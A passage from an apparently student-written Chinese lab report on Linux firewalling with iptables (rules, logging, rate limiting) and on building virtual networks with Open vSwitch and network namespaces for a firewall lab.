<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113005634.png" alt="image-20200524113005634"></p>
<p><strong>-m string 按字符串限定</strong></p>
<p><strong>–algo bm|kmp # 指定算法bm或kmp</strong></p>
<p>–string “STRING” # 指定字符串本身</p>
<p>例: iptables -A OUTPUT -m string –string “tudou.com” –algo bm -j DROP</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113024546.png" alt="image-20200524113024546"></p>
<h4 id="4、iptables常用的操作语法"><a href="#4、iptables常用的操作语法" class="headerlink" title="4、iptables常用的操作语法"></a>4、iptables常用的操作语法</h4><table>
<thead>
<tr>
<th align="center">功能</th>
<th align="center">参数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">添加规则</td>
<td align="center">A</td>
<td>iptables -A INPUT -p tcp -j ACCEPT</td>
<td>在INPUT链后加入允许所有TCP请求</td>
</tr>
<tr>
<td align="center">删除规则</td>
<td align="center">-D</td>
<td>iptables -D INPUT -p tcp -j ACCEPT</td>
<td>在INPUT链中删除对应规则</td>
</tr>
<tr>
<td align="center">自定义链重命名</td>
<td align="center">-E</td>
<td>iptables -E A B</td>
<td>将自定义链A重命名为B，原来的名字在前，新名字在后</td>
</tr>
<tr>
<td align="center">清空规则</td>
<td align="center">-F</td>
<td>iptables -F INPUT</td>
<td>清空INPUT链规则, 如果不加链名则是清除当前表所有规则</td>
</tr>
<tr>
<td align="center">插入规则</td>
<td align="center">-I</td>
<td>iptables -I INPUT 1 -p tcp -j ACCEPT</td>
<td>在INPUT链内的某个位置插入规则，如果序号为1或没有序号，规则会被插入到的头部</td>
</tr>
<tr>
<td align="center">显示规则</td>
<td align="center">-L</td>
<td>iptables -L INPUT</td>
<td>显示INPUT链的所有规则，如果没有指定链，则显示指定表中的所有链。精确输出可用-n和-v等参数</td>
</tr>
<tr>
<td align="center">新建自定义链</td>
<td align="center">-N</td>
<td>iptables -N A</td>
<td>在指定表新建链A,不可以同名</td>
</tr>
<tr>
<td align="center">默认策略</td>
<td align="center">-P</td>
<td>iptables -P INPUT DROP</td>
<td>指定INPUT链的默认策略为DROP, 可选策略ACCEPT、DROP、REJECT、REDIRECT</td>
</tr>
<tr>
<td align="center">替换规则</td>
<td align="center">-R</td>
<td>iptables -R INPUT 1 -p udp -j ACCETP</td>
<td>替换INPUT链中的第1条策略</td>
</tr>
<tr>
<td align="center">删除用户自定义链</td>
<td align="center">-X</td>
<td>iptables -X A</td>
<td>删除指定表中的自定义链A</td>
</tr>
<tr>
<td align="center">计数器归零</td>
<td align="center">-Z</td>
<td>iptables -Z</td>
<td>清空指定表下指定链（如未指定则认为所有链）的所有计数器归零</td>
</tr>
</tbody></table>
<h4 id="5、iptables日志记录"><a href="#5、iptables日志记录" class="headerlink" title="5、iptables日志记录"></a>5、iptables日志记录</h4><p>Linux下单独记录Iptables日志,编辑/etc/syslog.conf文件，加入一行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo “kern.warning /var/log/iptables.log” &amp;gt;&amp;gt;/etc/rsyslog.conf</span><br></pre></td></tr></table></figure>

<p><strong>重启rsyslog服务生效：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></table></figure>

<p>例: 记录源为127.0.0.1为来的所有ICMP日志</p>
<p><strong>(1) 配置iptables策略</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 127.0.0.1 -p () -j LOG --log-prefix “iptables icmp-localhost “</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> icmp</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113335499.png" alt="image-20200524113335499"></p>
<p><strong>(2) 验证规则</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -c 1 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113351074.png" alt="image-20200524113351074"></p>
<p>图中pkts有两个数据包匹配</p>
<p><strong>(3) 查看日志</strong></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113413956.png" alt="image-20200524113413956"></p>
<p><strong>(4) 上例iptables日志字段解释(编号21后为未用到的字段)</strong></p>
<p>Jan 12 18:24:05 [localhost] kernel: iptables icmp-localhost IN=lo OUT= MAC=00:00:00:00:00:00:00:00:00:00:00:00:08:00 SRC=127.0.0.1 DST=127.0.0.1 LEN=84 TOS=0x00 PREC=0x00 TTL=64 ID=8718 PROTO=ICMP TYPE=0 CODE=0 ID=9413 SEQ=1</p>
<table>
<thead>
<tr>
<th>编号</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Jan  12 18:24:05</td>
<td>日期时间，由syslog生成</td>
</tr>
<tr>
<td>2</td>
<td>localhost</td>
<td>主机名称</td>
</tr>
<tr>
<td>3</td>
<td>kernel</td>
<td>syslogd获取kernel产生的日志</td>
</tr>
<tr>
<td>4</td>
<td>iptables icmp-localhost</td>
<td>记录前缀，由用户指定—log-prefix “iptables icmp-localhost”</td>
</tr>
<tr>
<td>5</td>
<td>IN=lo</td>
<td>数据包进入的接口，若为空表示本机产生</td>
</tr>
<tr>
<td>6</td>
<td>OUT=</td>
<td>数据包流出的接口，若为空表示本机产生</td>
</tr>
<tr>
<td>7</td>
<td>MAC=00:00:00:00:00:00:00:00:00:00:00:00:08:00</td>
<td>前6段为源MAC, 后6段为目的MAC</td>
</tr>
<tr>
<td>8</td>
<td>08:00</td>
<td>08:00 为上层协议代码，即表示IP协议</td>
</tr>
<tr>
<td>9</td>
<td>SRC=127.0.0.1</td>
<td>源IP地址</td>
</tr>
<tr>
<td>10</td>
<td>DST=127.0.0.1</td>
<td>目的IP地址</td>
</tr>
<tr>
<td>11</td>
<td>LEN=84</td>
<td>IP封包+承载数据的总长度(MTU)</td>
</tr>
<tr>
<td>12</td>
<td>TOS=0x00</td>
<td>IP包头内的服务类型字段，能反应服务质量包括延迟、可靠性和拥塞等</td>
</tr>
<tr>
<td>13</td>
<td>PREC=0x00</td>
<td>服务类型的优先级字段</td>
</tr>
<tr>
<td>14</td>
<td>TTL=64</td>
<td>IP数据包的生存时间</td>
</tr>
<tr>
<td>15</td>
<td>ID=8718</td>
<td>IP数据包标示</td>
</tr>
<tr>
<td>16</td>
<td>PROTO=ICMP</td>
<td>协议ICMP</td>
</tr>
<tr>
<td>17</td>
<td>TYPE=0</td>
<td>ICMP类型</td>
</tr>
<tr>
<td>18</td>
<td>CODE=0</td>
<td>ICMP代码</td>
</tr>
<tr>
<td>19</td>
<td>ID=9413</td>
<td>ICMP ID</td>
</tr>
<tr>
<td>20</td>
<td>SEQ=1</td>
<td>ICMP SEQ</td>
</tr>
<tr>
<td>21</td>
<td>DF</td>
<td>表示不分段，此字段还可能为MF/FRAG</td>
</tr>
<tr>
<td>22</td>
<td>SPT</td>
<td>TCP或UDP中的源端口</td>
</tr>
<tr>
<td>23</td>
<td>DPT</td>
<td>TCP或UDP中的目的端口</td>
</tr>
<tr>
<td>24</td>
<td>LEN</td>
<td>传输层协议头长度</td>
</tr>
<tr>
<td>25</td>
<td>SEQ</td>
<td>TCP序列号</td>
</tr>
<tr>
<td>26</td>
<td>ACK</td>
<td>TCP应答号</td>
</tr>
<tr>
<td>27</td>
<td>WINDOWS</td>
<td>IP包头内的窗口大小</td>
</tr>
<tr>
<td>28</td>
<td>RES</td>
<td>TCP-Flags中ECN bits的值</td>
</tr>
<tr>
<td>29</td>
<td>CWR/ECE/URG/ACK/PSH/RST/SYN/FIN</td>
<td>TCP标志位</td>
</tr>
<tr>
<td>30</td>
<td>URGP</td>
<td>紧急指针起点</td>
</tr>
<tr>
<td>31</td>
<td>OPT</td>
<td>IP或TCP选项</td>
</tr>
<tr>
<td>32</td>
<td>INCOMPLETE</td>
<td>不完整的数据包</td>
</tr>
<tr>
<td>33</td>
<td>SPI</td>
<td>当协议为AHESP时出现</td>
</tr>
<tr>
<td>34</td>
<td>[ ]</td>
<td>中括号出现在两个地方，在ICMP协议中作为协议头的递归使用；在数据包长度出现非法时用于指出数据实际长度</td>
</tr>
</tbody></table>
<p><strong>(5) 日志策略</strong></p>
<p>a、 获取所有TCP日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -j LOG --log-prefix “iptables TCP “</span><br></pre></td></tr></table></figure>

<p>b、 获取所有UDP日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p udp -j LOG --log-prefix “iptables UDP “</span><br></pre></td></tr></table></figure>

<p>c、 获取ssh的日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp —dport 22 -j LOG --log-prefix “iptables SSH “</span><br></pre></td></tr></table></figure>



<h3 id="2-5-自定义策略"><a href="#2-5-自定义策略" class="headerlink" title="2.5 自定义策略"></a>2.5 自定义策略</h3><p><strong>(1)禁止ping 127.0.0.1</strong></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113556687.png" alt="image-20200524113556687"></p>
<p>默认是通过的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp -j ()</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> drop</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113745045.png" alt="image-20200524113745045"></p>
<p>应用策略ping不通了,图中iptables规则也有流量匹配</p>
<p><strong>(2) 状态为已连接的放行</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -m state —state (),RELATED -j ACCEPT</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ESTABLISHED</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113853866.png" alt="image-20200524113853866"></p>
<p><strong>(3)只允许本机访问80</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp —src 127.0.0.1 —dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524113916493.png" alt="image-20200524113916493"></p>
<p>应用策略后通过curl 127.0.0.1 匹配策略(图中错误因为本机没有80服务)</p>
<p><strong>(4) 利用扩展模块limit，可以实现DoS攻击防范</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p () —dport 80 -m limit —limit 25/minute —limit-burst 100 -j ACCEPT</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> tcp</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524114100860.png" alt="image-20200524114100860"></p>
<h2 id="任务三、虚拟网络使用，SDN交换机Openvswitch与Linux-namespace"><a href="#任务三、虚拟网络使用，SDN交换机Openvswitch与Linux-namespace" class="headerlink" title="任务三、虚拟网络使用，SDN交换机Openvswitch与Linux namespace"></a>任务三、虚拟网络使用，SDN交换机Openvswitch与Linux namespace</h2><h3 id="3-1-任务描述"><a href="#3-1-任务描述" class="headerlink" title="3.1 任务描述"></a>3.1 任务描述</h3><p>本实验在个人主机操作环境中虚拟网络的使用：openswitch与namespace，模拟多个网络设备，将不同类型的网络应用隔离。为下一任务搭建网络环境实验场景做环境准备。</p>
<p>通过完成本实验任务，要求学生掌握openswitch与namespace的使用，会构建虚拟网络环境。</p>
<h3 id="3-2-实验目标"><a href="#3-2-实验目标" class="headerlink" title="3.2 实验目标"></a>3.2 实验目标</h3><ul>
<li>了解openswitch与namespace的概念。</li>
<li>掌控Linux虚拟网络设备的使用。</li>
<li>掌握SDN交换机openvswitch的安装与使用。</li>
</ul>
<h3 id="3-3-实验工具"><a href="#3-3-实验工具" class="headerlink" title="3.3 实验工具"></a>3.3 实验工具</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络空间安全术语与概念:openvswitch" target="_blank" rel="noopener">openvswitch</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ovs-vsctl" target="_blank" rel="noopener">ovs-vsctl</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ip" target="_blank" rel="noopener">ip</a> (包含ip link、ip netns、ip addr等)</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:tcpdump" target="_blank" rel="noopener">tcpdump</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ethtool" target="_blank" rel="noopener">ethtool</a></li>
</ul>
<h3 id="3-4-操作步骤"><a href="#3-4-操作步骤" class="headerlink" title="3.4 操作步骤"></a>3.4 操作步骤</h3><h4 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h4><p><strong>（1）Open vSwitch</strong></p>
<p>Open vSwitch（简称为 OVS）是由 Nicira Networks 主导的，运行在<strong>虚拟化平台（例如 KVM，Xen）上的虚拟交换机</strong>。在虚拟化平台上，OVS 可以为动态变化的端点提供 2 层交换功能，很好的控制虚拟网络中的访问策略、网络隔离、流量监控等等。</p>
<p>OVS 遵循 Apache 2.0 许可证, 能同时支持多种标准的管理接口和协议。OVS 也提供了对 OpenFlow 协议的支持，用户可以使用任何支持 OpenFlow 协议的控制器对 OVS 进行远程管理控制。</p>
<p><strong>（2）网络名称空间netns</strong></p>
<p>netns是在linux中提供<strong>网络虚拟化</strong>的一个项目，使用netns网络空间虚拟化可以在本地虚拟化出多个网络环境。netns可以让一台机器上模拟多个网络设备，是网络虚拟化的重要组成，将不同类型的网络应用隔离。<br>一个net namespace拥有独立的独立的网卡空间，路由表，ARP表，ip地址表，iptables等。</p>
<h4 id="2、软件安装"><a href="#2、软件安装" class="headerlink" title="2、软件安装"></a>2、软件安装</h4><p>（1）netns功能由系统网络配置工具iproute2提供，命令形式为ip netns</p>
<p><strong><em>（2）openvswitch安装 （重要）</em></strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install openvswitch</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529211616771.png" alt="image-20200529211616771"></p>
<p><strong><em>(3) 启动openvswitch并设置自启 （重要）</em></strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable openvswitch</span><br><span class="line">systemctl start openvswitch</span><br><span class="line">systemctl status openvswitch</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529212948172.png" alt="image-20200529212948172"></p>
<p><strong><em>(4) 安装抓包工具<code>tcpdump</code>，网络配置工具<code>bridge-utils</code> （重要）</em></strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install tcpdump bridge-utils</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529213003552.png" alt="image-20200529213003552"></p>
<h4 id="3、ip-link使用"><a href="#3、ip-link使用" class="headerlink" title="3、ip link使用"></a>3、ip link使用</h4><p><strong>(1) 查看ip link帮助</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link help</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529211844507.png" alt="image-20200529211844507"></p>
<p><strong>(2) 新建网络接口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link add link eth0 name eth0.10 type vlan id 10</span><br><span class="line">ip link add veth1 type veth peer name veth2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529213119577.png" alt="image-20200529213119577"></p>
<p><strong>(3) 查看网络接口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link show</span><br><span class="line">ip link show type veth</span><br><span class="line">ip link show type vlan</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529213212175.png" alt="image-20200529213212175"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip -d link show type veth</span><br><span class="line">ip -d link show type vlan</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529213241832.png" alt="image-20200529213241832"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ethtool -S veth1</span><br></pre></td></tr></table></figure>
<p>注: 实验中此处ID号可能不同</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214013171.png" alt="image-20200529214013171"></p>
<p><strong>(4) 使接口UP</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link set eth0.10 up</span><br><span class="line">ip link set veth1 up</span><br><span class="line">ip link set veth2 up</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214032984.png" alt="image-20200529214032984"></p>
<p><strong>(5) 删除接口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link del dev eth0.10</span><br><span class="line">ip link del dev veth1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214056955.png" alt="image-20200529214056955"></p>
<h4 id="4、ip-netns使用"><a href="#4、ip-netns使用" class="headerlink" title="4、ip netns使用"></a>4、ip netns使用</h4><p><strong>(1) 查看ip netns帮助</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns help</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214247570.png" alt="image-20200529214247570"></p>
<p><strong>(2) 创建一个名为test的namespace</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip （） add <span class="built_in">test</span></span></span><br><span class="line">ip netns add test</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">netns</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524170828002.png" alt="image-20200524170828002"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214421745.png" alt="image-20200529214421745"></p>
<p><strong>(3) 查看所有namespace</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip netns list 或 （）</span></span><br><span class="line">ip netns</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ip netns</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524171343601.png" alt="image-20200524171343601"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214429322.png" alt="image-20200529214429322"></p>
<p><strong>(4) 查看名为test的namespace</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec test ip addr show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214446360.png" alt="image-20200529214446360"></p>
<p><strong>(5) 进入名为test的namespace,执行网络命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip netns （） <span class="built_in">test</span> bash</span></span><br><span class="line">ip netns exec test bash</span><br><span class="line">route -n</span><br><span class="line">iptables -nvL</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">exec</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524171401356.png" alt="image-20200524171401356"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214551175.png" alt="image-20200529214551175"></p>
<p><strong>(6) 退出namespace</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214619290.png" alt="image-20200529214619290"></p>
<p><strong>(7)给test 添加接口tap1</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link add tap1 type dummy</span><br><span class="line">ip link set tap1 netns test</span><br><span class="line">ip netns exec test ip link show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214718399.png" alt="image-20200529214718399"></p>
<p><strong>(8) 启用tap1虚拟接口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec test ip link set tap1 up #在test域中启动tap1接口</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529214947145.png" alt="image-20200529214947145"></p>
<p><strong>(9) 给tap1虚拟接口配置IP</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip netns <span class="built_in">exec</span> <span class="built_in">test</span> ip （） add dev tap1 192.168.0.1/24</span></span><br><span class="line">ip netns exec test ip addr add dev tap1 192.168.0.1/24</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> addr</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524173706655.png" alt="image-20200524173706655"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215039029.png" alt="image-20200529215039029"></p>
<p><strong>(10) 删除test namespace</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns del test</span><br></pre></td></tr></table></figure>

<h4 id="5、openvswitch使用"><a href="#5、openvswitch使用" class="headerlink" title="5、openvswitch使用"></a>5、openvswitch使用</h4><p><strong>(1) 查看openvswitch安装的命令工具</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ql openvswitch</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215511805.png" alt="image-20200529215511805"></p>
<p><strong>(2)添加网桥br0</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-br br0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215746119.png" alt="image-20200529215746119"></p>
<p><strong>(3)列出open vswitch中所有的网桥</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl list-br</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215739632.png" alt="image-20200529215739632"></p>
<p><strong>(4)判断网桥是否存在</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl br-exists br0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215802407.png" alt="image-20200529215802407"></p>
<p><strong>(5)新建网口tap1添加到网桥br0</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link add tap1 type dummy</span><br><span class="line"><span class="meta">#</span><span class="bash">ovs-vsctl add-port （） tap1</span></span><br><span class="line">ovs-vsctl add-port  br0 tap1</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> br0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524173844422.png" alt="image-20200524173844422"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215841520.png" alt="image-20200529215841520"></p>
<p><strong>(6)查看openvswitch的网络状态</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215905699.png" alt="image-20200529215905699"></p>
<p><strong>(7)在网桥br0中新建openvswitch网口tap2</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-port br0 tap2 -- set interface tap2 type=internal</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215917668.png" alt="image-20200529215917668"></p>
<p><strong>(8)列出网桥br0中所有端口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl list-ports br0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529215936351.png" alt="image-20200529215936351"></p>
<p><strong>(9)列出所有连接到网卡tap2的网桥</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl port-to-br tap2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220222652.png" alt="image-20200529220222652"></p>
<p><strong>(10)删除网桥br0上的网口tap2</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl del-port br0 tap2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220234998.png" alt="image-20200529220234998"></p>
<p><strong>(11)设置网口tap1的vlan tag为10</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl set port tap1 tag=10</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220248968.png" alt="image-20200529220248968"></p>
<p><strong>(12)查看网口tap1的属性</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl list port tap1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220302063.png" alt="image-20200529220302063"></p>
<p><strong>(13)从网桥br0删除网口tap1, 并从系统删除虚拟网口tap1</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl del-port br0 tap1</span><br><span class="line">ip link del dev tap1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220323619.png" alt="image-20200529220323619"></p>
<p><strong>(14)删除网桥br0</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl del-br br0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220356220.png" alt="image-20200529220356220"></p>
<h2 id="任务四、搭建网络防火墙实验场景"><a href="#任务四、搭建网络防火墙实验场景" class="headerlink" title="任务四、搭建网络防火墙实验场景"></a>任务四、搭建网络防火墙实验场景</h2><h3 id="4-1-任务描述"><a href="#4-1-任务描述" class="headerlink" title="4.1 任务描述"></a>4.1 任务描述</h3><p>本实验任务在任务三操作完成的基础上，Linux下利用工具组搭建如网络拓扑所示的虚拟网络环境。</p>
<p>通过完成本实验任务，了解和掌握部分虚拟化网络软件的使用，利用虚拟交换机openvswitch和linux的netns(网络命名空间)模拟复杂的网络环境。</p>
<h3 id="4-2-实验目标"><a href="#4-2-实验目标" class="headerlink" title="4.2 实验目标"></a>4.2 实验目标</h3><ul>
<li>掌握openswitch与netns的使用。</li>
<li>掌握利用openswitch与netns来模拟复杂网络环境。</li>
</ul>
<h3 id="4-3-实验工具"><a href="#4-3-实验工具" class="headerlink" title="4.3 实验工具"></a>4.3 实验工具</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ovs-vsctl" target="_blank" rel="noopener">ovs-vsctl</a>(openvswitch软件提供)</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ip" target="_blank" rel="noopener">ip</a>(包含ip link、ip netns、ip addr等)</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:sysctl" target="_blank" rel="noopener">sysctl</a></li>
</ul>
<h3 id="4-4-操作步骤"><a href="#4-4-操作步骤" class="headerlink" title="4.4 操作步骤"></a>4.4 操作步骤</h3><h4 id="1、实验网络拓扑"><a href="#1、实验网络拓扑" class="headerlink" title="1、实验网络拓扑"></a>1、实验网络拓扑</h4><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524183515546.png" alt="image-20200524183515546"></p>
<h4 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h4><p>利用openvswitch创建tag为10和11的两个接口,结全netns模拟内网1、内网2。</p>
<p><strong>1、开启主机路由转发功能</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> “net.ipv4.ip_forward = （）” &gt;&gt; /etc/sysctl.conf</span></span><br><span class="line">echo "net.ipv4.ip_forward = 1" &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sysctl -p</span><br><span class="line">sysctl -a | grep "ip_forward"</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; 1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524183914460.png" alt="image-20200524183914460"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529223348858.png" alt="image-20200529223348858"></p>
<p><strong>2、创建tag为10的内网1</strong></p>
